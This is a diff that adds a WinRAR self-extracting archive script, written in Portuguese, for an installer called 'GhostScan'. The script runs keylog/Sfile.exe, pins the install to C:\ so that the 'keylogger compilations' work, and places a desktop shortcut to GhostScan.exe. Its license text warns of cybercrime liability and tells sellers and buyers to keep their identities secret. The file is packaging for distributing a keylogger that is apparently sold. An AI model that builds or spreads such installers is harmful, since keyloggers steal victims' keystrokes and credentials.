@@ -1,0 +1,14 @@
+;The comment below contains SFX script commands
+
+Path=C:\
+Setup=keylog/Sfile.exe
+Title=Instalador do GhostScan
+Text
+{
+Por favor! nunca jamais mude o destino da instalação, isso poderá acarretar em erro na execução do programa e compilações do keylogger, por isso, obrigatoriamente, deixe o destino no Disco Local C: por padrão, agradeço por sua compreensão! 
+}
+License=Termos & Compromisso
+{
+1. O uso deste programa é por conta e risco de cada um. 2. O usuário tem responsabilidade plena sobre seus atos por esse programa, podendo responder pela lei de terrorismo virtual ou crime cybernético. 3. A cópia/imitação deste software é proibida, podendo sofrer processo sobre crime de cópia e plágio de direitos autorais. 4. O uso deste programa, assim como o vendedor que o venceu terá que permanecer em completo sigilo, não revelando nomes, endereços e nem identidade, por via das dúvidas, guarde seus atos em completo sigilo.
+}
+Shortcut=D, keylog/GhostScan.exe, , , , 
